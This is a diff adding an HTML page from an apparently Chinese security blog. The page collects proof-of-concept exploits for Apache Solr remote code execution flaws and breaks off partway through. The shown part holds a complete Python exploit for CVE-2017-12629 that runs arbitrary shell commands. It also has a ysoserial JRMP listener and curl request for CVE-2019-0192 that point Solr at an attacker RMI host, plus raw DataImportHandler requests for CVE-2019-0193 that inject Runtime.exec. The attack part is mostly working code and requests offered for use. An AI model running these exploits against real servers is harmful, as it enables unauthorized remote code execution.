@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+<meta name="description" content="solr是基于lucene的一个搜索服务器，lucene也是Apache的一个开源项目。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache-Solr">
+<meta property="og:url" content="http://example.com/2021/04/13/Apache-Solr/index.html">
+<meta property="og:site_name" content="隐秘行动">
+<meta property="og:description" content="solr是基于lucene的一个搜索服务器，lucene也是Apache的一个开源项目。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-13T14:39:36.000Z">
+<meta property="article:modified_time" content="2021-04-13T15:03:00.362Z">
+<meta property="article:author" content="nicaishui">
+<meta property="article:tag" content="Apache-Solr">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/04/13/Apache-Solr/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>Apache-Solr | 隐秘行动</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">隐秘行动</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-主页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a></li>
+        <li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2017-12629-RCE"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-12629-RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-0192-RCE"><span class="nav-number">2.</span> <span class="nav-text">CVE-2019-0192-RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-0193-RCE"><span class="nav-number">3.</span> <span class="nav-text">CVE-2019-0193-RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-12409-LINUX-RCE"><span class="nav-number">4.</span> <span class="nav-text">CVE-2019-12409-LINUX-RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-17558-RCE"><span class="nav-number">5.</span> <span class="nav-text">CVE-2019-17558-RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-13957-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RCE"><span class="nav-number">6.</span> <span class="nav-text">CVE-2020-13957-文件上传-RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2021%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">7.</span> <span class="nav-text">2021任意文件读取</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nicaishui"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">nicaishui</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fakename" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fakename@gmail.com" title="E-Mail → mailto:fakename@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/fakename" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/fakename" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/13/Apache-Solr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Apache-Solr
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-04-13 22:39:36 / 修改时间：23:03:00" itemprop="dateCreated datePublished" datetime="2021-04-13T22:39:36+08:00">2021-04-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/POC/" itemprop="url" rel="index"><span itemprop="name">POC</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class=""></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>19k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>18 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>solr是基于<a target="_blank" rel="noopener" href="http://lucene.apache.org/">lucene</a>的一个搜索服务器，lucene也是Apache的一个开源项目。<a id="more"></a></p>
+<p>configSet方法建立core：<br>/solr/admin/cores?_=1565751818092&amp;action=CREATE&amp;instanceDir=new_core&amp;name=solr777&amp;wt=json&amp;configSet=_default</p>
+<h1 id="CVE-2017-12629-RCE"><a href="#CVE-2017-12629-RCE" class="headerlink" title="CVE-2017-12629-RCE"></a>CVE-2017-12629-RCE</h1><p>Apache Solr 5.5.0到7.0.1版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"># author:zhzyker</span><br><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span><br><span class="line"># telegram:t.me&#x2F;zhzyker</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!&#x3D;4:</span><br><span class="line">    print(&#39;+--------------------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ DES: by zhzyker as https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub                     +&#39;)</span><br><span class="line">    print(&#39;+      Apache Solr Commons Remote Code Execution                           +&#39;)</span><br><span class="line">    print(&#39;+--------------------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ USE: python3 cve-2017-12629_cmd.py &lt;url&gt; &lt;listener_name&gt; &lt;cmd&gt;           +&#39;)</span><br><span class="line">    print(&#39;+ EXP: python3 cve-2017-12629_cmd.py http:&#x2F;&#x2F;ip:8983 name &quot;touch &#x2F;tmp&#x2F;123&quot;  +&#39;)</span><br><span class="line">    print(&#39;+ VER: Apache Solr &lt; 7.1.0                                                 +&#39;)</span><br><span class="line">    print(&#39;+--------------------------------------------------------------------------+&#39;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line">listener &#x3D; sys.argv[2]</span><br><span class="line">cmd &#x3D; sys.argv[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get core name</span><br><span class="line">core_url &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;</span><br><span class="line">try:</span><br><span class="line">    r &#x3D; requests.request(&quot;GET&quot;, url&#x3D;core_url, timeout&#x3D;20)</span><br><span class="line">    core_name &#x3D; list(json.loads(r.text)[&quot;status&quot;])[0]</span><br><span class="line">    print (&quot;[+] GET CORE NAME: &quot;+url+&quot;&#x2F;solr&#x2F;&quot;+core_name+&quot;&#x2F;config&quot;)</span><br><span class="line">except:</span><br><span class="line">    print (&quot;[-] Target Not Vuln Good Luck&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line">    </span><br><span class="line">cmd_url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; +core_name+ &quot;&#x2F;config&quot;</span><br><span class="line">exec_url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; +core_name+ &quot;&#x2F;update&quot;</span><br><span class="line">#print (cmd_url)</span><br><span class="line">#print (exec_url)</span><br><span class="line">    </span><br><span class="line">headers_cmd &#x3D; &#123;</span><br><span class="line">    &#39;Host&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;Accept&#39;: &quot;*&#x2F;*&quot;,</span><br><span class="line">    &#39;Accept-Language&#39;: &quot;en&quot;,</span><br><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)&quot;,</span><br><span class="line">    &#39;Connection&#39;: &quot;close&quot;,</span><br><span class="line">    &#39;Content-Length&#39;: &quot;160&quot;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">headers_exec &#x3D; &#123;</span><br><span class="line">    &#39;Host&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;ccept-Language&#39;: &quot;en&quot;,</span><br><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)&quot;,</span><br><span class="line">    &#39;Connection&#39;: &quot;close&quot;,</span><br><span class="line">    &#39;Content-Type&#39;: &quot;application&#x2F;json&quot;,</span><br><span class="line">    &#39;Content-Length&#39;: &quot;15&quot;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_cmd &#x3D; &quot;&quot;&quot;</span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;%s&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;&#x2F;bin&#x2F;&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;%s&quot;]&#125;&#125;</span><br><span class="line">&quot;&quot;&quot; % (listener,cmd)</span><br><span class="line"></span><br><span class="line">payload_exec &#x3D; &quot;&quot;&quot;</span><br><span class="line">[&#123;&quot;id&quot;:&quot;test&quot;&#125;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.request(&quot;POST&quot;, url&#x3D;cmd_url, data&#x3D;payload_cmd, headers&#x3D;headers_cmd, timeout&#x3D;30)</span><br><span class="line">a &#x3D; list(json.loads(r.text))[1]</span><br><span class="line">if &quot;errorMessages&quot; in a:</span><br><span class="line">    print (&quot;[-] Listener Repeat&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.request(&quot;POST&quot;, url&#x3D;exec_url, data&#x3D;payload_exec, headers&#x3D;headers_exec, timeout&#x3D;30)</span><br><span class="line">if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">    print (&quot;[+] Command Executed Successfully (Effective about one minute) (No Echo)&quot;)</span><br><span class="line">else:</span><br><span class="line">    print (&quot;[-] Command Executed Failed&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>工具：cve-2017-12629_cmd.py</p>
+<h1 id="CVE-2019-0192-RCE"><a href="#CVE-2019-0192-RCE" class="headerlink" title="CVE-2019-0192-RCE"></a>CVE-2019-0192-RCE</h1><p>Apache Solr 5.0.0-5.5.5 版本</p>
+<p>Apache Solr 6.0.0-6.6.5 版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;touch &#x2F;tmp&#x2F;pwn.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solr&#x2F;[corename]&#x2F;config</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;set-property&quot;: &#123;&quot;jmx.serviceUrl&quot;: &quot;service:jmx:rmi:&#x2F;&#x2F;&#x2F;jndi&#x2F;rmi:&#x2F;&#x2F;1.1.1.1:1099&#x2F;obj&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">受影响的版本包括Solr 5.0.0到5.5.5和6.0.0到6.6.5。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -i -s -k  -X $&#39;POST&#39; \</span><br><span class="line">    -H $&#39;Host: 172.17.0.2:8983&#39; \</span><br><span class="line">    -H $&#39;Content-Type: application&#x2F;json&#39; \</span><br><span class="line">    --data-binary $&#39;&#123;\&quot;set-property\&quot;:&#123;\&quot;jmx.serviceUrl\&quot;:\&quot;service:jmx:rmi:&#x2F;&#x2F;&#x2F;jndi&#x2F;rmi:&#x2F;&#x2F;172.17.0.1:1099&#x2F;obj\&quot;&#125;&#125;&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.17.0.2:8983&#x2F;solr&#x2F;ckan&#x2F;config&#x2F;jmx&#39;</span><br></pre></td></tr></table></figure>
+<h1 id="CVE-2019-0193-RCE"><a href="#CVE-2019-0193-RCE" class="headerlink" title="CVE-2019-0193-RCE"></a>CVE-2019-0193-RCE</h1><p>Apache Solr &lt; 8.2.0 并且开启了DataImportHandler模块</p>
+<p>无回显POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;tika&#x2F;dataimport HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;solr.com:8983&#x2F;solr&#x2F;</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 997</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;false&amp;debug&#x3D;true&amp;core&#x3D;tika&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123;</span><br><span class="line">java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">  ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">        &lt;document&gt;</span><br><span class="line">                &lt;entity name&#x3D;&quot;slashdot&quot;</span><br><span class="line">                        pk&#x3D;&quot;link&quot;</span><br><span class="line">                        url&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;1135&#x2F;solr_exploit&#x2F;master&#x2F;URLDataSource&#x2F;demo.xml&quot;</span><br><span class="line">                        processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">                        forEach&#x3D;&quot;&#x2F;RDF&#x2F;channel | &#x2F;RDF&#x2F;item&quot;</span><br><span class="line">                        transformer&#x3D;&quot;script:poc&quot;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;subject&quot;      xpath&#x3D;&quot;&#x2F;RDF&#x2F;channel&#x2F;subject&quot; commonField&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;title&quot;        xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;title&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;link&quot;         xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;link&quot; &#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;entity&gt;</span><br><span class="line">        &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">     &lt;script&gt;&lt;![CDATA[</span><br><span class="line">        function f1(row)&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        return row;</span><br><span class="line">        &#125;</span><br><span class="line">    ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">            url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">            processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach&#x3D;&quot;&#x2F;feed|&#x2F;feed&#x2F;entry&quot;</span><br><span class="line">            transformer&#x3D;&quot;script:f1&quot;&gt;</span><br><span class="line">    &lt;&#x2F;entity&gt;</span><br><span class="line">  &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>有回显POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span 